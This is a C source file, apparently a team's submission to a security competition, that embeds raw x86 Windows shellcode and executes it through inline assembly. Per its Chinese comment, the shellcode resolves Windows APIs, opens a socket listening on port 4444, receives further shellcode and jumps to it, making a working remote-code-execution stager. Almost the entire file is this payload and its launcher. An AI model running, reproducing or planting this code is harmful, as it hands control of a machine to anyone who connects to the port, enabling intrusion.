//###########################
//#
//#  队伍：   Random  
//#
//#  提交者： RPG 
//#
//########################


#include<stdio.h>
#include<stdlib.h>


/*


server.cpp的功能：

1、创建socket服务，进行监听4444端口。
2、recv到shellcode后，直接跳转执行。

 */
unsigned char shellcode[] = 
"\xFC\x68\x76\x90\x97\xC7\x68\xB1\x1E\x97\x01\x68\x0C\x9F\xD3\x4B"
"\x68\x64\x10\xA7\xDD\x68\x2D\x32\x78\xDE\x68\x3D\x6A\xB4\x80\x68"
"\x32\x74\x91\x0C\x68\x67\x59\xDE\x1E\x8B\xF4\x8D\x7E\xDC\x64\x8B"
"\x1D\x30\x00\x00\x00\x8B\x4B\x0C\x8B\x49\x0C\x8B\x09\x8B\x09\x8B"
"\x69\x18\x33\xDB\xB7\x03\x2B\xE3\x66\xBB\x33\x32\x53\x68\x77\x73"
"\x32\x5F\x54\xAD\x3D\x3D\x6A\xB4\x80\x75\x06\x95\xFF\x57\xFC\x95"
"\x57\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59\x20\x03\xDD"
"\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A\xC4\x74\x08"
"\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75\xE4\x8B\x59"
"\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03\x2C\xBB\x95"
"\x5F\xAB\x57\x61\x3D\x76\x90\x97\xC7\x75\xA8\x5E\x54\x6A\x02\xAD"
"\xFF\xD0\x8D\x48\x30\x8B\xFC\xF3\xAB\x40\x50\x40\x50\xAD\xFF\xD0"
"\x95\xB8\x02\xFF\x11\x5C\x32\xE4\x50\x54\x55\xAD\xFF\xD0\x85\xC0"
"\x74\xF8\x95\x33\xD2\x80\xC2\x40\x52\x33\xD2\x80\xC6\x10\x52\xB6"
"\x03\x52\x33\xD2\x52\xFF\x56\xE4\x95\x33\xD2\x52\xB6\x03\x52\x55"
"\x50\xFF\x16\xFF\xE5";



int main(int argc , char* argv[])
{


	printf("shellcode is running....\n");
	__asm{
		pushad
		lea eax, shellcode
		push eax
		ret
		popad
	
	}
	return 0;

}